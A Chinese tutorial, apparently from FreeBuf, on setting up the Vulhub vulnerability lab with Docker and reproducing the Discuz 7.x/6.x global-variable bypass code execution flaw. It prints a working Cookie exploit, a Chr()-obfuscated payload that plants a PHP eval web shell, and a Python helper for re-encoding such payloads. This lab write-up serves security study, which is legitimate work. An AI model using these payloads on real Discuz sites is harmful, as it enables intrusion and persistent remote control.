## 简介

**[Vulhub](https://vulhub.org/)是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。**

> 物理机：Windows 10
>
> 虚拟机：Centos 7192.168.1.13，网卡设置为NAT模式

## 环境安装

### 安装Docker

    
    
     $ curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun  
     ​

### 安装Docker-Compose

> 下面提供2种安装方式，2选1即可

离线安装。先到[Docker-Compose](https://github.com/docker/compose/releases)下载最新版本的docker-compose-Linux-x86_64，并上传到虚拟机

    
    
     # 然后将其移动到/usr/local/bin目录并改名为docker-compose  
     $ mv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose  
     ​  
     # 添加执行权限  
     $ sudo chmod +x /usr/local/bin/docker-compose  
     ​  
     # 验证  
     $ docker-compose version  
     ​

Pip安装

    
    
     # 安装docker-compose  
     $ pip install docker-compose  
     ​  
     # 如果没有pip需要先安装  
     $ yum -y install epel-release  
     $ yum -y install python-pip  
     $ pip --version  # 查看pip版本  
     ​  
     # 可能会遇到一个ReadTimeoutError的错误,需要修改pip源,请看文末问题汇总  
     ​

### 安装Vulhub

> 同上，两种方法2选1

离线安装。下载[Vulhub压缩包](https://github.com/vulhub/vulhub/archive/master.zip)，并上传到虚拟机任意目录，这里放在/root/目录

    
    
     # 创建一个vulhub目录并将压缩包放进去  
     $ mkdir vulhub && mv master.zip vulhub/ && cd vulhub/  
     # 解压  
     $ unzip master.zip  
     ​

Git安装

    
    
     $ git clone https://github.com/vulhub/vulhub.git  
     ​  
     # 如果没有Git需要先安装  
     $ yum install -y git  
     ​

### Docker加速

> 可选。配置阿里云镜像加速

这里的加速器地址可以在阿里云[容器加速服务](https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors)中的镜像加速器获取

    
    
     $ sudo mkdir -p /etc/docker  
     $ vim /etc/docker/daemon.json  
     # 加入以下代码  
     {  
       "registry-mirrors": ["加速器地址"]  
     }  
     ​  
     $ sudo systemctl daemon-reload  
     $ sudo systemctl restart docker  
     ​

## 靶场使用

选择漏洞环境,在Vulhub中选择某个环境，cd进入对应目录

    
    
     $ cd vulhub/discuz/wooyun-2010-080723/

可选。可以通过vi编辑其中的docker-compose.yml，修改端口和账号密码

    
    
     $ vi docker-compose.yml  
     ​

启动环境：

    
    
    $ docker-compose up -d   # 启动环境 
    $ docker-compose down    # 关闭环境,需要在该环境目录下执行
    

可选。编译环境。启动环境后，会自动查找当前目录下的配置文件。

> 如果配置文件中包含的环境均已经存在，则不会再次编译，反之则会自动进行编译。所以，其实docker-compose up -d命令是包含了docker-> compose build的。
>
> 但是如果更新了配置文件，则需要手工来重新编译靶场环境。
    
    
    $ docker-compose build
    

## 物理机访问容器

>
> 经过上面的配置，已经可以在虚拟机Centos7中使用浏览器访问对应的漏洞环境。但此时物理机是无法通过浏览器访问漏洞环境的，需要手动配置静态路由，将通往Docker的数据包交给虚拟机192.168.1.13来转发

先查看一下Docker容器的IP

    
    
    $ docker ps  # 查看运行服务端口
    CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS                  NAMES
    a4eed382479c        vulhub/discuz:7.2   "docker-php-entrypoi…"   About a minute ago   Up About a minute   0.0.0.0:8080->80/tcp   wooyun-2010-080723_discuz_1
    15b46d6919a9        mysql:5.5           "docker-entrypoint.s…"   About a minute ago   Up About a minute   3306/tcp               wooyun-2010-080723_db_1
    
    $ docker inspect [容器ID] | grep IPAddress  # [容器ID]为漏洞环境所在容器,此处为a4eed382479c
    # "IPAddress": "172.18.0.3"
    

先关闭虚拟机防火墙

    
    
    $ systemctl stop firewalld.service
    

物理机使用管理员模式打开CMD

    
    
    $ route add -p 172.18.0.0 mask 255.255.0.0 192.168.1.13 # -p 永久路由,重启系统路由仍有效
    $ route print  # 打印当前路由表
    ================================================================
    永久路由:
      网络地址          网络掩码          网关地址        跃点数
      172.18.0.0      255.255.0.0     192.168.1.13       1
    ================================================================
    
    

下面，就以前面选择的靶场vulhub/discuz/wooyun-2010-080723/来进行复现，该目录内靶场环境对应的漏洞是[Discuz
7.x/6.x
全局变量防御绕过导致代码执行](https://vulhub.org/#/environments/discuz/wooyun-2010-080723/)。如需复现其它漏洞可以参考：[Vulhub-漏洞环境](https://vulhub.org/#/environments/)

## 启动环境

选择漏洞环境。首先在Vulhub中选择靶场环境，cd进入对应目录

    
    
    $ cd vulhub/discuz/wooyun-2010-080723/
    

修改端口和账号密码（可选）。可以通过vi编辑其中的docker-compose.yml来进行修改

    
    
    $ vi docker-compose.yml
    

启动环境

    
    
    $ docker-compose up -d   # 启动环境 
    # Starting wooyun-2010-080723_db_1 ... done
    # Starting wooyun-2010-080723_discuz_1 ... done
    
    

查看靶机运行端口

    
    
    # 主要看容器ID和端口,然后通过容器ID查看IP
    $ docker ps  # 查看运行服务端口
    ================================================
    CONTAINER ID        IMAGE               PORTS
    a4eed382479c        vulhub/discuz:7.2   0.0.0.0:8080->80/tcp 
    ================================================
    
    $ docker inspect [容器ID] | grep IPAddress  # [容器ID]为漏洞环境所在容器,此处为a4eed382479c
    # "IPAddress": "172.18.0.3"
    
    

## 复现步骤

>
> 浏览器访问http://[IP]:[Port]/install/，安装数据库。数据库服务器填写db，数据库名为discuz，数据库账号密码均为root，管理员密码任意。填写联系方式页面直接点击跳过本步后跳转到首页
>
> 登录成功后进入默认板块，开启Burp抓包，然后随便点击一篇贴子
>
> 将Cookie修改为下面，点击放包
    
    
    # EXP
    Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
    
      =====================================================================================
    # 此时完整的报文如下:
    GET /viewthread.php?tid=13&extra=page%3D1 HTTP/1.1
    Host: 172.18.0.3
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Referer: http://172.18.0.3/forumdisplay.php?fid=2
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
    Connection: close
    =====================================================================================
    
    

此时可以看到phpinfo()被执行

![](https://image.3001.net/images/20200203/1580717822_5e37d6fe50511.jpg!small)

## 前台GetShell

同样方法传入以下Cookie写入一句话木马文件，文件为x.php，密码为pwd

    
    
    # EXP
    Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
    
    

![](https://image.3001.net/images/20200203/1580717827_5e37d703aa361.jpg!small)

访问http://[IP]:[Port]/x.php，POST数据测试成功，且使用蚁剑连接也成功

![](https://image.3001.net/images/20200203/1580717836_5e37d70c02c51.jpg!small)

## 其它

复现完之后可以通过以下命令关闭环境，但注意此命令需要在对应环境目录下执行

    
    
    $ docker-compose down
    # Stopping wooyun-2010-080723_discuz_1 ... done
    # Stopping wooyun-2010-080723_db_1     ... done
    # Removing wooyun-2010-080723_discuz_1 ... done
    # Removing network wooyun-2010-080723_default
    
    

检查是否关闭

    
    
    $  docker ps
    

附一个ASCII码和字符互相转换的小脚本，方便修改POC的文件名和密码

    
    
    import re
    # ASCII = ord(Word)
    # Word = chr(ASCII)
    
    # ASCII -> Word
    def ASCII2word(ASCIIs):
    	for c in re.findall(r"(\d+)", ASCIIs):
    	    print(chr(int(c)),end="")
    
    # Word -> ASCII
    def word2ASCII(words):
    	ASCIIs = ""
    	for word in words:
    		ASCIIs += "Chr(" + str(ord(word)) + ")."
    	print(ASCIIs)
    
    asciis = "Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(109).Chr(105).Chr(115).Chr(104).Chr(105).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(101).Chr(115).Chr(116).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)"
    ASCII2word(asciis)
    
    words = "fputs(fopen('x.php','w'),'<?php @eval($_POST[pwd])?>');"
    word2ASCII(words)
    
    

## 问题汇总

下载Docker时候出现错误curl: (6) Could not resolve host: get.docker.com; Unknown error

    
    
    # 原因: DNS出现问题,修改DNS即可
    $ vim /etc/resolv.conf   # 修改DNS
    
    # Generated by NetworkManager
    nameserver 223.5.5.5  # AliDNS
    

出现问题：ERROR: Couldn't connect to Docker daemon at http+docker://localhost - is
it running

    
    
    $ service docker status  # 查看Docker状态
    $ service docker start   # 启动Docker
    

删除全部镜像

    
    
    # 如果想删除某个漏洞环境所有内容(包括镜像、容器、磁盘卷、网络),可以执行
    $ docker-compose down --rmi all -v
    

删除永久路由

    
    
    $ route delete 172.18.0.0    # 删除路由
    

Docker未启动

    
    
    $  service docker status    # 查看状态
    #  Active: inactive (dead)  # 出现此条即未启动
    $  service docker start
    

Pip安装时出现ReadTimeoutError错误

    
    
    $ mkdir ~/,pip/
    $ cd ~/,pip/
    $ vim pip.conf 
    # 添加以下代码
    [global]
    index-url=https://mirrors.aliyun.com/pypi/simple/
    $ pip install --upgrade pip  # 更新pip
    

## 参考

> [Vvulhub-漏洞环境](https://vulhub.org/#/environments/)
>
> [Docker+vulhub快速搭建漏洞环境](https://www.freebuf.com/column/204885.html)
>
> [Discuz 7.x 6.x 全局变量防御绕过导致代码执行漏洞利用-> 复现](https://baishunxd.github.io/2019/05/20/Discuz-7-x-6-x-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E5%A4%8D%E7%8E%B0/)

 ***本文作者：FengSec，转载请注明来自FreeBuf.COM**

